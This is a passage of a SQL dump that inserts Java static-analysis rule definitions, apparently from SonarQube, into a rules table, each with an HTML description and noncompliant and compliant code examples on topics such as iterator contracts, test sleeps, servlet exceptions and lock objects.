<code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code>, breaks the
<code>hasNext()</code> contract, and will lead to unexpected behavior in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FibonacciIterator implements Iterator&lt;Integer&gt;{
...
@Override
public boolean hasNext() {
  if(next() != null) {
    return true;
  }
  return false;
}
...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812792, 1510817812792, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (787, 'Standard functional interfaces should not be redefined', 'S1711', NULL, 'squid', '<p>Just as there is little justification for writing your own String class, there is no good reason to re-define one of the existing, standard
functional interfaces.</p>
<p>Doing so may seem tempting, since it would allow you to specify a little extra context with the name. But in the long run, it will be a source of
confusion, because maintenance programmers will wonder what is different between the custom functional interface and the standard one.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@FunctionalInterface
public interface MyInterface { // Noncompliant
	double toDouble(int a);
}

@FunctionalInterface
public interface ExtendedBooleanSupplier { // Noncompliant
  boolean get();
  default boolean isFalse() {
    return !get();
  }
}

public class MyClass {
    private int a;
    public double myMethod(MyInterface instance){
	return instance.toDouble(a);
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@FunctionalInterface
public interface ExtendedBooleanSupplier extends BooleanSupplier { // Compliant, extends java.util.function.BooleanSupplier
  default boolean isFalse() {
    return !getAsBoolean();
  }
}

public class MyClass {
    private int a;
    public double myMethod(IntToDoubleFunction instance){
	return instance.applyAsDouble(a);
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8', false, 'HTML', 1510817812800, 1510817812801, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (788, '"Thread.sleep" should not be used in tests', 'S2925', NULL, 'squid', '<p>Using <code>Thread.sleep</code> in a test is just generally a bad idea. It creates brittle tests that can fail unpredictably depending on
environment ("Passes on my machine!") or load. Don''t rely on timing (use mocks) or use libraries such as <code>Awaitility</code> for asynchroneous
testing. </p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoTheThing(){

  MyClass myClass = new MyClass();
  myClass.doTheThing();

  Thread.sleep(500);  // Noncompliant
  // assertions...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testDoTheThing(){

  MyClass myClass = new MyClass();
  myClass.doTheThing();

  await().atMost(2, Duration.SECONDS).until(didTheThing());  // Compliant
  // assertions...
}

private Callable&lt;Boolean&gt; didTheThing() {
  return new Callable&lt;Boolean&gt;() {
    public Boolean call() throws Exception {
      // check the condition that must be fulfilled...
    }
  };
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812801, 1510817812802, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (789, 'JUnit rules should be used', 'S2924', NULL, 'squid', '<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and
there''s no reason to leave them cluttering up the file if they''re not in use.</p>
<p>This rule raises an issue when <code>Test</code> class fields of the following types aren''t used by any of the test methods:
<code>TemporaryFolder</code>, and <code>TestName</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ProjectDefinitionTest {

  @Rule
  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey("mykey");
    assertThat(def.getKey(), is("mykey"));
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ProjectDefinitionTest {

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey("mykey");
    assertThat(def.getKey(), is("mykey"));
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'tests,unused', false, 'HTML', 1510817812803, 1510817812803, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (793, 'Exceptions should not be thrown from servlet methods', 'S1989', NULL, 'squid', '<p>Even though the signatures for methods in a servlet include <code>throws IOException, ServletException</code>, it''s a bad idea to let such
exceptions be thrown. Failure to catch exceptions in a servlet could leave a system in a vulnerable state, possibly resulting in denial-of-service
attacks, or the exposure of sensitive information because when a servlet throws an exception, the servlet container typically sends debugging
information back to the user. And that information could be very valuable to an attacker. </p>
<p>This rule checks all exceptions in methods named "do*" are explicitly handled in servlet classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws IOException, ServletException {
  String ip = request.getRemoteAddr();
  InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws IOException, ServletException {
  try {
    String ip = request.getRemoteAddr();
    InetAddress addr = InetAddress.getByName(ip);
    //...
  }
  catch (UnknownHostException uhex) {
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/600.html">MITRE, CWE-600</a> - Uncaught Exception in Servlet </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/s4EVAQ">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten Category A6</a> - Sensitive Data Exposure </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,error-handling,owasp-a6', false, 'HTML', 1510817812807, 1510817812808, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (794, '"DateUtils.truncate" from Apache Commons Lang library should not be used', 'S2718', NULL, 'squid', '<p>The use of the <code>Instant</code> class introduced in Java 8 to truncate a date can be significantly faster than the <code>DateUtils</code> class
from Commons Lang.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Date trunc(Date date) {
  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public Date trunc(Date date) {
  Instant instant = date.toInstant();
  instant = instant.truncatedTo(ChronoUnit.SECONDS);
  return Date.from(instant);
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8,performance', false, 'HTML', 1510817812809, 1510817812809, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (795, 'Unnecessary semicolons should be omitted', 'S2959', NULL, 'squid', '<p>Under the reasoning that cleaner code is better code, the semicolon at the end of a try-with-resources construct should be omitted because it can
be omitted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);  // ignored; this one''s required
      Reader r = new InputStreamReader(b);)   // Noncompliant
{
   //do stuff
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);
      Reader r = new InputStreamReader(b))
{
   //do stuff
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812810, 1510817812810, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (805, 'Abstract classes without fields should be converted to interfaces', 'S1610', NULL, 'squid', '<p>With Java 8''s "default method" feature, any abstract class without direct or inherited field should be converted into an interface. However, this
change may not be appropriate in libraries or other applications where the class is intended to be used as an API.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Car {
  public abstract void start(Environment c);

  public void stop(Environment c) {
    c.freeze(this);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Car {
  public void start(Environment c);

  public default void stop(Environment c) {
    c.freeze(this);
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8', false, 'HTML', 1510817812821, 1510817812821, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (796, 'Synchronization should not be based on Strings or boxed primitives', 'S1860', NULL, 'squid', '<p>Objects which are pooled and potentially reused should not be used for synchronization. If they are, it can cause unrelated threads to deadlock
with unhelpful stacktraces. Specifically, <code>String</code> literals, and boxed primitives such as Integers should not be used as lock objects
because they are pooled and reused. The story is even worse for <code>Boolean</code> objects, because there are only two instances of
<code>Boolean</code>, <code>Boolean.TRUE</code> and <code>Boolean.FALSE</code> and every class that uses a Boolean will be referring to one of the
two.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private static final Boolean bLock = Boolean.FALSE;
private static final Integer iLock = Integer.valueOf(0);
private static final String sLock = "LOCK";

public void doSomething() {

  synchronized(bLock) {  // Noncompliant
    // ...
  }
  synchronized(iLock) {  // Noncompliant
    // ...
  }
  synchronized(sLock) {  // Noncompliant
    // ...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Object lock1 = new Object();
private static final Object lock2 = new Object();
private static final Object lock3 = new Object();

public void doSomething() {

  synchronized(lock1) {
    // ...
  }
  synchronized(lock2) {
    // ...
  }
  synchronized(lock3) {
    // ...
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/rQGeAQ">CERT, LCK01-J.</a> - Do not synchronize on objects that may be reused </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,multi-threading', false, 'HTML', 1510817812811, 1510817812811, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (797, 'Related "if/else if" statements should not have the same condition', 'S1862', NULL, 'squid', '<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it''s simply dead code and
at worst, it''s a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();
}

</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,pitfall,unused', false, 'HTML', 1510817812812, 1510817812812, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (798, '@FunctionalInterface annotation should be used to flag Single Abstract Method interfaces', 'S1609', NULL, 'squid', '<p>A Single Abstract Method (SAM) interface is a Java interface containing only one method. The Java API is full of SAM interfaces, such as
<code>java.lang.Runnable</code>, <code>java.awt.event.ActionListener</code>, <code>java.util.Comparator</code> and
<code>java.util.concurrent.Callable</code>. SAM interfaces have a special place in Java 8 because they can be implemented using Lambda expressions or
Method references. </p>
<p>Using <code>@FunctionalInterface</code> forces a compile break when an additional, non-overriding abstract method is added to a SAM, which would
break the use of Lambda implementations.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Changeable&lt;T&gt; {
  public void change(T o);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@FunctionalInterface
public interface Changeable&lt;T&gt; {
  public void change(T o);
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812813, 1510817812814, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (801, 'Lambdas should be replaced with method references', 'S1612', NULL, 'squid', '<p>Method/constructor references are more compact and readable than using lambdas, and are therefore preferred. Similarly, <code>null</code> checks
can be replaced with references to the <code>Objects::isNull</code> and <code>Objects::nonNull</code> methods.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  void process(List&lt;A&gt; list) {
    list.stream()
      .map(a -&gt; a.&lt;String&gt;getObject())
      .forEach(a -&gt; { System.out.println(a); });
  }

  &lt;T&gt; T getObject() {
    return null;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  void process(List&lt;A&gt; list) {
    list.stream()
      .map(A::&lt;String&gt;getObject)
      .forEach(System.out::println);
  }

  &lt;T&gt; T getObject() {
    return null;
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'java8', false, 'HTML', 1510817812816, 1510817812817, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (802, 'Dead stores should be removed', 'S1854', NULL, 'squid', '<p>A dead store happens when a local variable is assigned a value, including <code>null</code>, that is not read by any subsequent instruction.
Calculating or retrieving a value only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it''s not an error,
it is at best a waste of resources. </p>
<p>Even assigning <code>null</code> to a variable is a dead store if the variable is not subsequently used. Assigning null as a hint to the garbage
collector used to be common practice, but is no longer needed and such code should be eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void pow(int a, int b) {
  if(b == 0) {
    return 0;
  }
  int x = a;
  for(int i= 1, i &lt; b, i++) {
    x = x * a;  //Dead store because the last return statement should return x instead of returning a
  }
  return a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void pow(int a, int b) {
  if(b == 0) {
    return 0;
  }
  int x = a;
  for(int i= 1, i &lt; b, i++) {
    x = x * a;
  }
  return x;
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, empty string (<code>""</code>), <code>true</code>, and <code>false</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use (''Unused Variable'') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/S4IyAQ">CERT, MSC13-CPP.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,unused', false, 'HTML', 1510817812818, 1510817812818, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (803, '"toString()" should never be called on a String object', 'S1858', NULL, 'squid', '<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant
construction may be optimized by the compiler, but will be confusing in the meantime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String message = "hello world";
System.out.println(message.toString()); // Noncompliant;
</pre>
<h2>Compliant Solution</h2>
<pre>
String message = "hello world";
System.out.println(message);
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812819, 1510817812819, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (804, '"instanceof" operators that always return "true" or "false" should be removed', 'S1850', NULL, 'squid', '<p><code>instanceof</code> operators that always return <code>true</code> or <code>false</code> are either useless or the result of a misunderstanding
which could lead to unexpected behavior in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isSuitable(Integer param) {
...
  String name = null;

  if (name instanceof String) { // Noncompliant; always false since name is null
    //...
  }

  if(param instanceof Number) {  // Noncompliant; always true unless param is null, because param is an Integer
    doSomething();
  }
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isSuitable(Integer param) {
...
  doSomething();
...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:squid:S2589} instead.</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812820, 1510817812820, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (806, '"switch" statements should end with "default" clauses', 'SwitchLastCaseIsDefaultCheck', 'S131', 'squid', '<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>If the <code>switch</code> parameter is an <code>Enum</code> and if all the constants of this enum are used in the <code>case</code> statements,
then no <code>default</code> clause is expected.</p>
<p>Example:</p>
<pre>
public enum Day {
    SUNDAY, MONDAY
}
...
switch(day) {
  case SUNDAY:
    doSomething();
    break;
  case MONDAY:
    doSomethingElse();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP.</a> - Strive for logical completeness </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,misra', false, 'HTML', 1510817812822, 1510817812823, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (807, '"@Deprecated" code should not be used', 'CallToDeprecatedMethod', 'S1874', 'squid', '<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning
that the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away
from the aging, soon-to-be-retired technology.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/**
 * @deprecated  As of release 1.3, replaced by {@link #Fee}
 */
@Deprecated
public class Fum { ... }

public class Foo {
  /**
   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}
   */
  @Deprecated
  public void doTheThing() { ... }

  public void doTheThingBetter() { ... }
}

public class Bar extends Foo {
  public void doTheThing() { ... } // Noncompliant; don''t override a deprecated method or explicitly mark it as @Deprecated
}

public class Bar extends Fum {  // Noncompliant; Fum is deprecated

  public void myMethod() {
    Foo foo = new Foo();  // okay; the class isn''t deprecated
    foo.doTheThing();  // Noncompliant; doTheThing method is deprecated
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KgAVAg">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,obsolete', false, 'HTML', 1510817812824, 1510817812824, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (808, '"deleteOnExit" should not be used', 'CallToFileDeleteOnExitMethod', 'S2308', 'squid', '<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>
<ul>
  <li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed. </li>
  <li> For each file handler, the memory associated with the handler is released only at the end of the process. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
File file = new File("file.txt");
file.deleteOnExit();  // Noncompliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'performance', false, 'HTML', 1510817812825, 1510817812825, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (812, 'Extensions and implementations should not be redundant', 'S1939', NULL, 'squid', '<p>All classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.</p>
<p>Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant. If you implement the interface, you also
implicitly implement its parents and there''s no need to do so explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface MyFace {
  // ...
}

public interface MyOtherFace extends MyFace {
  // ...
}

public class Foo
    extends Object // Noncompliant
    implements MyFace, MyOtherFace {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface MyFace {
  // ...
}

public interface MyOtherFace extends MyFace {
  // ...
}

public class Foo implements MyOtherFace {
  //...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812830, 1510817812830, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (809, 'Close curly brace and the next "else", "catch" and "finally" keywords should be located on the same line', 'RightCurlyBraceSameLineAsNextBlockCheck', 'S1107', 'squid', '<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>
<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or
<code>finally</code> keywords.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {
    doSomethingElse();
  }
  else {                               // Noncompliant
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  }
  finally {                            // Noncompliant
    closeConnection();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {
    doSomethingElse();
  } else {
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  } finally {
    closeConnection();
  }
}
